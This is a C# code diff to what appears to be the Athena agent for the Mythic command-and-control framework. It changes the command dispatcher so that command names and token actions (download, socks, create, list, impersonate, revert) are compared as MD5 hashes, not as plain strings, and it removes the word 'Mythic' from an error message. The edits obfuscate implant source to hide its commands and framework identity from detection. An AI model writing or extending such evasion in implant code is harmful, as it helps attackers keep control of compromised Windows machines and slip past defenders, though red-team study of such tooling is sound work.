@@ -65,7 +65,7 @@ namespace Athena.Commands
 #if WINBUILD
             await this.tokenHandler.ThreadImpersonate();
 #endif
-            switch (Misc.CreateMD5(job.task.command.ToLower())) //To lower "just in case"
+            switch (job.task.command.ToHash())
             {
                 case "FD456406745D816A45CAE554C788E754": //download
                     if (!await downloadHandler.ContainsJob(job.task.id))
@@ -132,7 +132,9 @@ namespace Athena.Commands
                     break;
                 case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
                     var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                    if((string)socksInfo["action"] == "start")
+
+
+                    if (((string)socksInfo["action"]).IsEqualTo("EA2B2676C28C0DB26D39331A336C6B92")) //start
                     {
                         StartSocksProxy(job);
                     }
@@ -154,21 +156,21 @@ namespace Athena.Commands
 #if WINBUILD
                 case "94A08DA1FECBB6E8B46990538C7B50B2": //token
                     var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                    string action = (string)tokenInfo["action"];
+                    string action = ((string)tokenInfo["action"]).ToHash();
 
-                    if (action == "create")
+                    if (action.IsEqualTo("76EA0BEBB3C22822B4F0DD9C9FD021C5")) //create
                     {
                         this.responseResults.Add(await this.tokenHandler.CreateToken(job));
                     }
-                    else if (action == "list")
+                    else if (action.IsEqualTo("10AE9FC7D453B0DD525D0EDF2EDE7961")) //list
                     {
                         this.responseResults.Add(await this.tokenHandler.ListTokens(job));
                     }
-                    else if (action == "impersonate")
+                    else if (action.IsEqualTo("7581CD24E6B3486B70B67D0434FD9DDC")) //impersonate
                     {
                         this.responseResults.Add(await this.tokenHandler.SetToken(job));
                     }
-                    else if (action == "revert")
+                    else if (action.IsEqualTo("4BC48A3C9AC7468D2D5D1A6FB5F87654")) //revert
                     {
                         this.responseResults.Add(await this.tokenHandler.RevertToSelf(job));
                     }
@@ -442,7 +444,7 @@ namespace Athena.Commands
                 {
                     task_id = response.task_id,
                     status = "error",
-                    user_output = "No file_id received from Mythic",
+                    user_output = "No file_id received",
                     completed = "true"
                 });
             }
